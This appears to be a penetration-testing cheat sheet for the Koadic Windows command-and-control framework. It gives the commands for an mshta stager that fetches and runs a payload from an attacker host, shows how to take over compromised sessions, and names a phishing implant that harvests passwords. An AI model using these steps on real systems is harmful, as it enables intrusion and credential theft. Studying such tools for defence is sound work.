--- ---

<h2>Top Commands</h2>

```
use stager/js/mshta             ---> Use the module to exploit
info                            ---> Check payload info
run

# Paste the outpu in windows
mshta http://.....

zombies                         ---> Show sessions
cmdshell NUMBER                 ---> Get in the session
```

- Modules (many available)
```
use MODULE
info
set zombie NUMBER(TARGET)

# Example
use implant/phish/password_box  ---> Pishing box creds
```

---

<h2>What is Koadic</h2>

Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. The major difference is that Koadic does most of its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in the core to support a default installation of Windows 2000 with no service packs (and potentially even versions of NT4) all the way through Windows 10.

It is possible to serve payloads completely in memory from stage 0 to beyond, as well as use cryptographically secure communications over SSL and TLS (depending on what the victim OS has enabled).